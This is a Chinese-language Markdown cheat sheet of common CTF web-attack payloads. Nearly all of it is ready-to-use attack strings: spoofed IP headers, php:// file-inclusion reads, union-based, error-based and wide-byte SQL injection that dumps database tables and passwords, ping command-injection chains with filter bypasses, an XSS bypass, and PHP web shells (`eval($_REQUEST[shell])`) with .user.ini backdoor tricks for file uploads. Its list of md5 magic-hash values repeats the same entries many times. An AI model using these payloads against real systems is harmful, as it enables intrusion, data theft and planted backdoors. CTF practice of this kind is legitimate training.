## CTF常用语句
- [思路](#思路)
- [CTF工具在线网站](#CTF工具在线网站)
    - [PHP在线运行环境](#PHP在线运行环境)
- [伪造IP](#伪造IP)
- [file://](#file://)
- [php://](#php://)
    - [php://filter读取源码](#php://filter读取源码)
    - [php://input执行代码](#php://input执行代码)
- [SQL注入思路](#SQL注入思路)
- [SQL手工注入语句](#SQL手工注入语句)
- [SQL绕过思路](#SQL绕过思路)
- [XSS-bypass](#XSS-bypass)
- [Ping常用命令](#Ping常用命令)
- [burpsuite-请求头](#burpsuite-请求头)
- [序列化与反序列化](#序列化与反序列化)
- [上传常用木马](#上传常用木马)
    - [htaccess](#htaccess)
    - [.user.ini](#.user.ini)
- [PHP代码审计常用语句](#PHP代码审计常用语句)
    - [MD5-MD5-MD5](#MD5-MD5-MD5)
    - [十六进制&&科学计数法](#十六进制&&科学计数法)
    - [反序列化常见方法](#反序列化常见方法)
- [Burpsuite](#Burpsuite)
    - [单一payload组+延时爆破](单一payload组+延时爆破)


## 思路
拿到一个网站的思路：

- 工具扫描 访问robots.txt
- 查看源代码 burpsuite看消息头回应

## CTF工具在线网站
## PHP在线运行环境
https://c.runoob.com/compile/1


## 伪造IP

```
x-forwarded-for: 127.0.0.1

x-remote-IP: 127.0.0.1

x-remote-ip: 127.0.0.1

x-client-ip: 127.0.0.1

x-client-IP: 127.0.0.1

X-Real-IP: 127.0.0.1
```

## file://

条件:存在ssrf curl漏洞触发

file:///var/www/html/flag

## php://
## php://filter读取源码

```
?file=php://filter/read=convert.base64-encode/resource=index.php
?action=php://filter/read=string.toupper|string.rot13/resource=index.php
?action=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=index.php
```
## php://input执行代码

- 条件:allow_url_include 为 on ，可以访问请求的原始数据的只读流, 将post请求中的数据作为 PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input ,同时post想设置的文件内容，php执行时会将post内容当作文件内容。

- 格式：
```
GET: ?text=php://input
POST : xxxx
```

## SQL注入思路

- 字符型还是整数型
- 是否为堆叠注入
> show databases;   获取数据库名
> show tables;  获取表名
> show columns from `table_name`; 获取列名
例子：    
1';show tables;#
1';show columns from `table_name`;#
## SQL手工注入语句

```
1' union select 1,database(),3# 
爆出数据库 
1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#
爆出表名 geekuser,l0ve1ysq1
1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#
爆出字段名 id,username,password
1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1 #
爆出字段内容
报错注入语句
               1 and updatexml(1,concat(0,database(),0,user(),0,@@datadir),1)#
?username=admin%27or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23
?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23
?username=admin%27or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1))%23
right()
```

**宽字节注入**

```
1%df' and 1=1 --+
1%df' and 1=2 --+ 

-1%df' union select 1,2 --+
-1%df' union select 1,database() --+
-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
-1%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+
-1%df' union select 1,flag from ctf4 --+

```
## SQL绕过思路
**单引号绕过**
- 十六进制替代
    - 0xxxxx

## XSS-bypass

```
\&#34;+confirm(1)+&#34;
```
## Ping常用命令

127.0.0.1;ls /
127.0.0.1;cat /flag

**管道符**
;	执行完前面语句再执行后面的。如ping 127.0.0.1; ls
|	显示后面语句的执行结果。如ping 127.0.0.1 | ls
||	前面语句出错时执行后面语句。如ping 127.0.0.1 || ls
&	前面语句为假则执行后面语句。如ping 127.0.0.1 & ls
&&	前面语句为假则报错，为真则执行后面语句。如ping 127.0.0.1 && ls


**过滤cat**
```bash
127.0.0.1;tac flag_573386320311.php #从最后一行倒序显示内容
127.0.0.1;more flag_573386320311.php #根据窗口大小，一页一页的现实文件内容
127.0.0.1;less flag_573386320311.php
127.0.0.1;head flag_573386320311.php # 只显示头几行
127.0.0.1;tail flag_573386320311.php # 只显示最后几行
127.0.0.1;nl flag_573386320311.php # 显示时输出行号
```

**过滤空格**
``< 、<>、%20(space)、%09(tab)、\$IFS\$9、 \${IFS}、$IFS、$IFS$1``

**过滤目录分隔符**
``;cd flag_is_here&&cat flag_128182724515598.php``

**内联绕过**

内联，就是将反引号内命令的输出作为输入执行。

?ip=127.0.0.1;cat `ls`

**base64绕过**

echo bHM= |base64 -d|bash
echo bHM= |base64 -d|sh


## burpsuite-请求头

Referer: https://www.Sycsecret.com
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1


## 序列化与反序列化

```php
<?php
class Name{
    private $username = 'admin';
    private $password = '100';
}
$a = new Name();
echo urlencode(serialize($a)); 
?>
```

## 上传常用木马
1. 序列化木马:
```php
<?php
class A{
	var $a = "<?php phpinfo()?>";
}
$aa = new A();
echo serialize($aa);
?>
```
1. Content-Type: image/jpeg
2. php,php3,php4,php5,phtml.pht
3. 扩展名绕过
Asp:asa cer cdx
Aspx:ashx asmx ascx
Php:php3 phptml
Jsp:jspx jspf
4. 
    ```
    <script language=php>system("ls")</script>
    ```
5. 
    ```
    GIF89a?
    <script language="php">eval($_REQUEST[shell])</script>
    ```

**resources**

[文件上传限制绕过原理以及方法总结](https://www.cnblogs.com/askta0/p/9190556.html#/c/subject/p/9190556.html)
### .htaccess
 .htaccess用于针对apache的

### .user.ini
考点: .user.ini后门
条件: 
- 服务器脚本语言为PHP
- 服务器使用CGI／FastCGI模式
- 上传目录下要有可执行的php文件

.user.ini
```
GIF89a
auto_prepend_file=a.jpg
```

a.jpg
```php
GIF89a
<script language="php">eval($_REQUEST[shell]);</script>
```

**resources**
https://xz.aliyun.com/t/6091#toc-1
https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html
## PHP代码审计常用语句


1.找到入口点，逐个突破
顾名思义，对于大多数页面，我们可以找到站点入口页面：index.php,admin.php,login.php等。逐一步进来分析。对于代码量小的源码可以采取这种方式。但当分析完整的框架/CMS时，基本可以gg。
2.危险函数/参数回溯法
最常用的审计（挖洞）方法。需要结合一些工具（例如：Xdebug+各类IDE）。通过部署环境——全局通扫危险函数/敏感参数——下断点/手动回溯——寻找是否存在利用链。这种方法可以快速定位潜在漏洞点上下文。
假如我们通扫到shell_exec,call_user_function,sql_query,eval这些喜闻乐见的函数，就可以定位到此处，然后回溯来推出是否存在利用链。
3.业务逻辑分析法
其实在做CTF的题目时候，我们都在使用这种方法。
存在登录框：是否存在SQL注入
存在登录/注册功能：是否存在二次注入
存在上传页面：是否存在上传
存在传URL参：是否存在SSRF
……
对于大的CMS，可以先部署完后，看一下存在什么功能。某些功能是漏洞的常客：初始安装（脱库），数据库备份（mysql重装getshell），密码找回（越权）等等。


### MD5-MD5-MD5

**MD5数组绕过**

若传入md5函数的参数为数组类型，则返回NULL，null===null，因此可以通过数组绕过===md5判断

a[]=1 & b[]=2

**常见的md5碰撞**
https://blog.csdn.net/qq_38603541/article/details/97108663

```
0e开头的md5和原值：
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

## 十六进制&&科学计数法

**科学计数法**
```php
var_dump(0 == "a"); // 0 == 0 -> true
var_dump("1" == "01"); // 1 == 1 -> true
var_dump("10" == "1e1"); // 10 == 10 -> true
var_dump(100 == "1e2"); // 100 == 100 -> true
```

## 反序列化常见方法

```php
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```

# Brupsuite

## 单一payload组+延时爆破

attack type： battering ram 这一模式是使用单一的payload组

options： throttle可设置延时毫秒
